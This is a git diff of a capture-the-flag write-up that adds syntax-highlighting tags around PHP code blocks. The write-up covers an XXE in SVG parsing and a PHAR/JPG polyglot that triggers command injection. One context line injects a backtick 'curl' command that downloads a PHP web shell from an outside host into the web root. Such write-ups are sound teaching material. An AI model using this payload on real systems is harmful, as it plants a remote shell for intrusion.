@@ -39,6 +39,7 @@ By visiting the `.gitignore` file it was possible to see that an un-accessible f
 
 It took 30 seconds to understand that there was a very easy to trigger `XXE` during `SVG` file parsing.
 ```
+{% highlight php %}
 <?php
 session_start();
 
@@ -106,7 +107,7 @@ class Image {
 
 new Image($_FILES['image']['tmp_name']);
 header('Location: index.php');
-
+{% endhighlight %}
 ```
 
 ### XXE ###
@@ -209,6 +210,7 @@ To exploit it we needed:
 
 Using some Google-fu we found a `PHP` script, which, with very few changes, was used to generate a `PHAR` which was also a valid `JPG` file.
 ```
+{% highlight php %}
 <?php
 class Image {}
 
@@ -237,10 +239,12 @@ $object->file_name = 'aaa`curl jbz.team/phpshell.txt > /var/www/html/images/<php
 $object->extension = 'txt';
 $phar->setMetadata($object);
 $phar->stopBuffering();
+{% endhighlight %}
 ```
 
 The injected `Image` object was used to trigger the command injection in the `system` function:
 ```
+{% highlight php %}
 class Image {
     [...]
     
@@ -260,6 +264,7 @@ class Image {
         $this->create_thumb();
     }
 }
+{% endhighlight %}
 ```
 
 
